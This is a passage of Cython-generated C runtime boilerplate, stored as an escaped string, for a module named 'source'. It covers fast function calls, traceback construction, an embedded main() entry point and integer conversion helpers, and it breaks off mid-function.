{\n    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);\n    PyObject *globals = PyFunction_GET_GLOBALS(func);\n    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);\n    PyObject *closure;\n#if PY_MAJOR_VERSION >= 3\n    PyObject *kwdefs;\n#endif\n    PyObject *kwtuple, **k;\n    PyObject **d;\n    Py_ssize_t nd;\n    Py_ssize_t nk;\n    PyObject *result;\n    assert(kwargs == NULL || PyDict_Check(kwargs));\n    nk = kwargs ? PyDict_Size(kwargs) : 0;\n    if (Py_EnterRecursiveCall((char*)\" while calling a Python object\")) {\n        return NULL;\n    }\n    if (\n#if PY_MAJOR_VERSION >= 3\n            co->co_kwonlyargcount == 0 &&\n#endif\n            likely(kwargs == NULL || nk == 0) &&\n            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {\n        if (argdefs == NULL && co->co_argcount == nargs) {\n            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);\n            goto done;\n        }\n        else if (nargs == 0 && argdefs != NULL\n                 && co->co_argcount == Py_SIZE(argdefs)) {\n            /* function called with no arguments, but all parameters have\n               a default value: use default values as arguments .*/\n            args = &PyTuple_GET_ITEM(argdefs, 0);\n            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);""\n            goto done;\n        }\n    }\n    if (kwargs != NULL) {\n        Py_ssize_t pos, i;\n        kwtuple = PyTuple_New(2 * nk);\n        if (kwtuple == NULL) {\n            result = NULL;\n            goto done;\n        }\n        k = &PyTuple_GET_ITEM(kwtuple, 0);\n        pos = i = 0;\n        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {\n            Py_INCREF(k[i]);\n            Py_INCREF(k[i+1]);\n            i += 2;\n        }\n        nk = i / 2;\n    }\n    else {\n        kwtuple = NULL;\n        k = NULL;\n    }\n    closure = PyFunction_GET_CLOSURE(func);\n#if PY_MAJOR_VERSION >= 3\n    kwdefs = PyFunction_GET_KW_DEFAULTS(func);\n#endif\n    if (argdefs != NULL) {\n        d = &PyTuple_GET_ITEM(argdefs, 0);\n        nd = Py_SIZE(argdefs);\n    }\n    else {\n        d = NULL;\n        nd = 0;\n    }\n#if PY_MAJOR_VERSION >= 3\n    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                               k, (int)nk,\n                               d, (int)nd, kwdefs, closure);\n#else\n    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                               k, (int)nk,\n                               d, (int)nd, closure);\n#endif\n    Py_XDECREF(kwtuple);\ndone:\n    Py_LeaveRecursiveCall();\n    return result;\n}\n#endif\n#endif\n\n/* PyObjectCallMethO */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {\n    PyObject *self, *result;\n    PyCFunction cfunc;\n    cfunc = PyCFunction_GET_FUNCTION(func);\n    self = PyCFunction_GET_SELF(func);\n    if (unlikely(Py_EnterRecursiveCall((char*)\" while calling a Python object\")))\n        return NULL;\n    result = cfunc(self, arg);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,""\n            \"NULL result without error in PyObject_Call\");\n    }\n    return result;\n}\n#endif\n\n/* PyObjectCallOneArg */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n    PyObject *result;\n    PyObject *args = PyTuple_New(1);\n    if (unlikely(!args)) return NULL;\n    Py_INCREF(arg);\n    PyTuple_SET_ITEM(args, 0, arg);\n    result = __Pyx_PyObject_Call(func, args, NULL);\n    Py_DECREF(args);\n    return result;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n#if CYTHON_FAST_PYCALL\n    if (PyFunction_Check(func)) {\n        return __Pyx_PyFunction_FastCall(func, &arg, 1);\n    }\n#endif\n    if (likely(PyCFunction_Check(func))) {\n        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {\n            return __Pyx_PyObject_CallMethO(func, arg);\n#if CYTHON_FAST_PYCCALL\n        } else if (__Pyx_PyFastCFunction_Check(func)) {\n            return __Pyx_PyCFunction_FastCall(func, &arg, 1);\n#endif\n        }\n    }\n    return __Pyx__PyObject_CallOneArg(func, arg);\n}\n#else\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n    PyObject *result;\n    PyObject *args = PyTuple_Pack(1, arg);\n    if (unlikely(!args)) return NULL;\n    result = __Pyx_PyObject_Call(func, args, NULL);\n    Py_DECREF(args);\n    return result;\n}\n#endif\n\n/* PyErrFetchRestore */\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    tmp_type = tstate->curexc_type;\n    tmp_value = tstate->curexc_value;\n    tmp_tb = tstate->curexc_traceback;\n    tstate->curexc_type = type;\n    tstate->curexc_value = value;\n    tstate->curexc_traceback = tb;\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n}\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThre""adState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n    *type = tstate->curexc_type;\n    *value = tstate->curexc_value;\n    *tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n}\n#endif\n\n/* CLineInTraceback */\n#ifndef CYTHON_CLINE_IN_TRACEBACK\nstatic int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {\n    PyObject *use_cline;\n    PyObject *ptype, *pvalue, *ptraceback;\n#if CYTHON_COMPILING_IN_CPYTHON\n    PyObject **cython_runtime_dict;\n#endif\n    if (unlikely(!__pyx_cython_runtime)) {\n        return c_line;\n    }\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n#if CYTHON_COMPILING_IN_CPYTHON\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);\n    if (likely(cython_runtime_dict)) {\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\n            use_cline, *cython_runtime_dict,\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))\n    } else\n#endif\n    {\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);\n      if (use_cline_obj) {\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\n        Py_DECREF(use_cline_obj);\n      } else {\n        PyErr_Clear();\n        use_cline = NULL;\n      }\n    }\n    if (!use_cline) {\n        c_line = 0;\n        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);\n    }\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {\n        c_line = 0;\n    }\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n    return c_line;\n}\n#endif\n\n/* CodeObjectCache */\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\n    int start = 0, mid = 0, end = count - 1;\n    if (end >= 0 && code_line > entries[end].code_line) {""\n        return count;\n    }\n    while (start < end) {\n        mid = start + (end - start) / 2;\n        if (code_line < entries[mid].code_line) {\n            end = mid;\n        } else if (code_line > entries[mid].code_line) {\n             start = mid + 1;\n        } else {\n            return mid;\n        }\n    }\n    if (code_line <= entries[mid].code_line) {\n        return mid;\n    } else {\n        return mid + 1;\n    }\n}\nstatic PyCodeObject *__pyx_find_code_object(int code_line) {\n    PyCodeObject* code_object;\n    int pos;\n    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {\n        return NULL;\n    }\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\n    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {\n        return NULL;\n    }\n    code_object = __pyx_code_cache.entries[pos].code_object;\n    Py_INCREF(code_object);\n    return code_object;\n}\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {\n    int pos, i;\n    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;\n    if (unlikely(!code_line)) {\n        return;\n    }\n    if (unlikely(!entries)) {\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\n        if (likely(entries)) {\n            __pyx_code_cache.entries = entries;\n            __pyx_code_cache.max_count = 64;\n            __pyx_code_cache.count = 1;\n            entries[0].code_line = code_line;\n            entries[0].code_object = code_object;\n            Py_INCREF(code_object);\n        }\n        return;\n    }\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\n    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {\n        PyCodeObject* tmp = entries[pos].code_object;\n        entries[pos].cod""e_object = code_object;\n        Py_DECREF(tmp);\n        return;\n    }\n    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {\n        int new_max = __pyx_code_cache.max_count + 64;\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(\n            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\n        if (unlikely(!entries)) {\n            return;\n        }\n        __pyx_code_cache.entries = entries;\n        __pyx_code_cache.max_count = new_max;\n    }\n    for (i=__pyx_code_cache.count; i>pos; i--) {\n        entries[i] = entries[i-1];\n    }\n    entries[pos].code_line = code_line;\n    entries[pos].code_object = code_object;\n    __pyx_code_cache.count++;\n    Py_INCREF(code_object);\n}\n\n/* AddTraceback */\n#include \"compile.h\"\n#include \"frameobject.h\"\n#include \"traceback.h\"\n#if PY_VERSION_HEX >= 0x030b00a6\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include \"internal/pycore_frame.h\"\n#endif\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\n            const char *funcname, int c_line,\n            int py_line, const char *filename) {\n    PyCodeObject *py_code = NULL;\n    PyObject *py_funcname = NULL;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_srcfile = NULL;\n    py_srcfile = PyString_FromString(filename);\n    if (!py_srcfile) goto bad;\n    #endif\n    if (c_line) {\n        #if PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromFormat( \"%s (%s:%d)\", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        #else\n        py_funcname = PyUnicode_FromFormat( \"%s (%s:%d)\", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        funcname = PyUnicode_AsUTF8(py_funcname);\n        if (!funcname) goto bad;\n        #endif\n    }\n    else {\n        #if PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromString(funcname);\n        if (!py_funcname) goto bad;\n        #endif\n    }\n    #if PY_""MAJOR_VERSION < 3\n    py_code = __Pyx_PyCode_New(\n        0,\n        0,\n        0,\n        0,\n        0,\n        __pyx_empty_bytes, /*PyObject *code,*/\n        __pyx_empty_tuple, /*PyObject *consts,*/\n        __pyx_empty_tuple, /*PyObject *names,*/\n        __pyx_empty_tuple, /*PyObject *varnames,*/\n        __pyx_empty_tuple, /*PyObject *freevars,*/\n        __pyx_empty_tuple, /*PyObject *cellvars,*/\n        py_srcfile,   /*PyObject *filename,*/\n        py_funcname,  /*PyObject *name,*/\n        py_line,\n        __pyx_empty_bytes  /*PyObject *lnotab*/\n    );\n    Py_DECREF(py_srcfile);\n    #else\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\n    #endif\n    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline\n    return py_code;\nbad:\n    Py_XDECREF(py_funcname);\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_srcfile);\n    #endif\n    return NULL;\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyCodeObject *py_code = 0;\n    PyFrameObject *py_frame = 0;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject *ptype, *pvalue, *ptraceback;\n    if (c_line) {\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\n    }\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\n    if (!py_code) {\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n        py_code = __Pyx_CreateCodeObjectForTraceback(\n            funcname, c_line, py_line, filename);\n        if (!py_code) {\n            /* If the code object creation fails, then we should clear the\n               fetched exception references and propagate the new exception */\n            Py_XDECREF(ptype);\n            Py_XDECREF(pvalue);\n            Py_XDECREF(ptraceback);\n            goto bad;\n        }\n        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n        __pyx_insert_code_object(c_line ? -""c_line : py_line, py_code);\n    }\n    py_frame = PyFrame_New(\n        tstate,            /*PyThreadState *tstate,*/\n        py_code,           /*PyCodeObject *code,*/\n        __pyx_d,    /*PyObject *globals,*/\n        0                  /*PyObject *locals*/\n    );\n    if (!py_frame) goto bad;\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\n    PyTraceBack_Here(py_frame);\nbad:\n    Py_XDECREF(py_code);\n    Py_XDECREF(py_frame);\n}\n\n/* MainFunction */\n#ifdef __FreeBSD__\n#include <floatingpoint.h>\n#endif\n#if PY_MAJOR_VERSION < 3\nint main(int argc, char** argv) {\n#elif defined(WIN32) || defined(MS_WINDOWS)\nint wmain(int argc, wchar_t **argv) {\n#else\nstatic int __Pyx_main(int argc, wchar_t **argv) {\n#endif\n    /* 754 requires that FP exceptions run in \"no stop\" mode by default,\n     * and until C vendors implement C99's ways to control FP exceptions,\n     * Python requires non-stop mode.  Alas, some platforms enable FP\n     * exceptions by default.  Here we disable them.\n     */\n#ifdef __FreeBSD__\n    fp_except_t m;\n    m = fpgetmask();\n    fpsetmask(m & ~FP_X_OFL);\n#endif\n    if (argc && argv)\n        Py_SetProgramName(argv[0]);\n    Py_Initialize();\n    if (argc && argv)\n        PySys_SetArgv(argc, argv);\n    {\n      PyObject* m = NULL;\n      __pyx_module_is_main_source = 1;\n      #if PY_MAJOR_VERSION < 3\n          initsource();\n      #elif CYTHON_PEP489_MULTI_PHASE_INIT\n          m = PyInit_source();\n          if (!PyModule_Check(m)) {\n              PyModuleDef *mdef = (PyModuleDef *) m;\n              PyObject *modname = PyUnicode_FromString(\"__main__\");\n              m = NULL;\n              if (modname) {\n                  m = PyModule_NewObject(modname);\n                  Py_DECREF(modname);\n                  if (m) PyModule_ExecDef(m, mdef);\n              }\n          }\n      #else\n          m = PyInit_source();\n      #endif\n      if (PyErr_Occurred()) {\n          PyErr_Print();\n          #if PY_MA""JOR_VERSION < 3\n          if (Py_FlushLine()) PyErr_Clear();\n          #endif\n          return 1;\n      }\n      Py_XDECREF(m);\n    }\n#if PY_VERSION_HEX < 0x03060000\n    Py_Finalize();\n#else\n    if (Py_FinalizeEx() < 0)\n        return 2;\n#endif\n    return 0;\n}\n#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)\n#include <locale.h>\nstatic wchar_t*\n__Pyx_char2wchar(char* arg)\n{\n    wchar_t *res;\n#ifdef HAVE_BROKEN_MBSTOWCS\n    /* Some platforms have a broken implementation of\n     * mbstowcs which does not count the characters that\n     * would result from conversion.  Use an upper bound.\n     */\n    size_t argsize = strlen(arg);\n#else\n    size_t argsize = mbstowcs(NULL, arg, 0);\n#endif\n    size_t count;\n    unsigned char *in;\n    wchar_t *out;\n#ifdef HAVE_MBRTOWC\n    mbstate_t mbs;\n#endif\n    if (argsize != (size_t)-1) {\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\n        if (!res)\n            goto oom;\n        count = mbstowcs(res, arg, argsize+1);\n        if (count != (size_t)-1) {\n            wchar_t *tmp;\n            /* Only use the result if it contains no\n               surrogate characters. */\n            for (tmp = res; *tmp != 0 &&\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\n                ;\n            if (*tmp == 0)\n                return res;\n        }\n        free(res);\n    }\n#ifdef HAVE_MBRTOWC\n    /* Overallocate; as multi-byte characters are in the argument, the\n       actual output could use less memory. */\n    argsize = strlen(arg) + 1;\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    memset(&mbs, 0, sizeof mbs);\n    while (argsize) {\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\n        if (converted == 0)\n            break;\n        if (converted == (size_t)-2) {\n            /* Incomplete character. This should never happen,\n       ""        since we provide everything that we have -\n               unless there is a bug in the C library, or I\n               misunderstood how mbrtowc works. */\n            fprintf(stderr, \"unexpected mbrtowc result -2\\\\n\");\n            free(res);\n            return NULL;\n        }\n        if (converted == (size_t)-1) {\n            /* Conversion error. Escape as UTF-8b, and start over\n               in the initial shift state. */\n            *out++ = 0xdc00 + *in++;\n            argsize--;\n            memset(&mbs, 0, sizeof mbs);\n            continue;\n        }\n        if (*out >= 0xd800 && *out <= 0xdfff) {\n            /* Surrogate character.  Escape the original\n               byte sequence with surrogateescape. */\n            argsize -= converted;\n            while (converted--)\n                *out++ = 0xdc00 + *in++;\n            continue;\n        }\n        in += converted;\n        argsize -= converted;\n        out++;\n    }\n#else\n    /* Cannot use C locale for escaping; manually escape as if charset\n       is ASCII (i.e. escape all bytes > 128. This will still roundtrip\n       correctly in the locale's charset, which must be an ASCII superset. */\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    while(*in)\n        if(*in < 128)\n            *out++ = *in++;\n        else\n            *out++ = 0xdc00 + *in++;\n    *out = 0;\n#endif\n    return res;\noom:\n    fprintf(stderr, \"out of memory\\\\n\");\n    return NULL;\n}\nint\nmain(int argc, char **argv)\n{\n    if (!argc) {\n        return __Pyx_main(0, NULL);\n    }\n    else {\n        int i, res;\n        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        char *oldloc = strdup(setlocale(LC_ALL, NULL));\n        if (!argv_copy || !argv_copy2 || !oldloc) {\n            fprintf(stderr, \"out of ""memory\\\\n\");\n            free(argv_copy);\n            free(argv_copy2);\n            free(oldloc);\n            return 1;\n        }\n        res = 0;\n        setlocale(LC_ALL, \"\");\n        for (i = 0; i < argc; i++) {\n            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);\n            if (!argv_copy[i]) res = 1;\n        }\n        setlocale(LC_ALL, oldloc);\n        free(oldloc);\n        if (res == 0)\n            res = __Pyx_main(argc, argv_copy);\n        for (i = 0; i < argc; i++) {\n#if PY_VERSION_HEX < 0x03050000\n            free(argv_copy2[i]);\n#else\n            PyMem_RawFree(argv_copy2[i]);\n#endif\n        }\n        free(argv_copy);\n        free(argv_copy2);\n        return res;\n    }\n}\n#endif\n\n/* CIntToPy */\n    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (is_unsigned) {\n        if (sizeof(long) < sizeof(long)) {\n            return PyInt_FromLong((long) value);\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\n            return PyLong_FromUnsignedLong((unsigned long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\n#endif\n        }\n    } else {\n        if (sizeof(long) <= sizeof(long)) {\n            return PyInt_FromLong((long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\n#endif\n        }\n    }\n    {\n        int one = 1; int little = (int)*(unsigned char *)&one;\n        unsigned char *bytes = (unsigned char *)&value;\n        return _""PyLong_FromByteArray(bytes, sizeof(long),\n                                     little, !is_unsigned);\n    }\n}\n\n/* CIntFromPyVerify */\n    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\n#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\n    {\\\n        func_type value = func_value;\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\n            if (unlikely(value != (func_type) (target_type) value)) {\\\n                func_type zero = 0;\\\n                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\\\n                    return (target_type) -1;\\\n                if (is_unsigned && unlikely(value < zero))\\\n                    goto raise_neg_overflow;\\\n                else\\\n                    goto raise_overflow;\\\n            }\\\n        }\\\n        return (target_type) value;\\\n    }\n\n/* CIntFromPy */\n    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_Check(x))) {\n        if (sizeof(long) < sizeof(long)) {\n            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);\n            if (is_unsigned && unlikely(val < 0)) {\n                goto raise_neg_overflow;\n            }\n            return (long) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS""\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (long) 0;\n                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])\n                case 2:\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {\n                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {\n                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {\n                            return (long) (((((((((long)digits[""3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n            }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (long) -1;\n                if (unlikely(result == 1))\n                    goto raise_neg_overflow;\n            }\n#endif\n            if (sizeof(long) <= sizeof(unsigned long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (long) 0;\n                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))\n                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])\n                case -2:\n                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:""\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n          ""              if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n            }\n#endif\n            if (sizeof(long) <= sizeof(long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n                